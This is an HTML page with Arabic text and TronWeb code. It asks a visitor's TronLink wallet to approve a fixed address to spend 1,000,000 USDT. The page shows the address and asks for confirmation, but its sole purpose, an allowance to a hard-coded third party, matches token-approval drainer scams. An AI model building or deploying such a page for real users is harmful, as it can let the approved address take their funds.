<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Approve USDT TRC20</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #4CAF50; color: white; border: none; border-radius: 5px; }
    button:hover { background-color: #45a049; }
    #loading { color: green; font-weight: bold; display: none; margin-top: 10px; }
    p { margin: 20px; }
  </style>
</head>
<body>
  <h2>تفويض 1,000,000 USDT على شبكة ترون</h2>
  <p>اضغط على الزر لمنح صلاحية لعنوان: <br><strong>TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
  <button onclick="approveUSDT()">إعطاء صلاحية للتفويض</button>
  <div id="loading">جاري معالجة المعاملة...</div>

  <script>
    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const spenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";

    async function approveUSDT() {
      try {
        const loadingDiv = document.getElementById("loading");
        loadingDiv.style.display = "block";

        // التحقق من وجود TronLink
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
          alert("يرجى تثبيت TronLink وتسجيل الدخول إلى محفظتك.");
          loadingDiv.style.display = "none";
          return;
        }

        // التحقق من الشبكة
        if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
          alert("يرجى الاتصال بشبكة ترون الرئيسية (Mainnet).");
          loadingDiv.style.display = "none";
          return;
        }

        // التحقق من صحة عنوان Spender
        if (!window.tronWeb.isAddress(spenderAddress)) {
          alert("عنوان المفوض (Spender) غير صالح!");
          loadingDiv.style.display = "none";
          return;
        }

        // إعداد ABI لعقد USDT
        const usdtABI = [
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [{ "name": "", "type": "bool" }],
            "type": "function",
            "stateMutability": "nonpayable"
          }
        ];

        // إعداد العقد
        const contract = await window.tronWeb.contract(usdtABI, usdtContractAddress);

        // قيمة الـ Approve: 1,000,000 USDT (1,000,000 * 10^6)
        const amount = "1000000000000";

        // تأكيد من المستخدم قبل إرسال المعاملة
        if (!confirm(`هل أنت متأكد من منح صلاحية 1,000,000 USDT للعنوان: ${spenderAddress}؟\nملاحظة: سيتم التفويض حتى لو لم يكن لديك رصيد كافٍ.`)) {
          loadingDiv.style.display = "none";
          return;
        }

        // إرسال معاملة Approve
        const tx = await contract.approve(spenderAddress, amount).send({
          feeLimit: 15000000, // 15 TRX، مناسب لمعاملة Approve
          callValue: 0
        });

        alert(`تم إرسال معاملة التفويض بنجاح!\nمعرف المعاملة (TxID):\n${tx}`);
        console.log("Transaction ID:", tx);
        loadingDiv.style.display = "none";

      } catch (error) {
        console.error("خطأ أثناء المعاملة:", error);
        alert(`فشل تنفيذ عملية التفويض:\n${error.message || error}\nتأكد من وجود رصيد TRX كافٍ (حوالي 15 TRX) لدفع رسوم المعاملة.`);
        document.getElementById("loading").style.display = "none";
      }
    }
  </script>
</body>
</html>
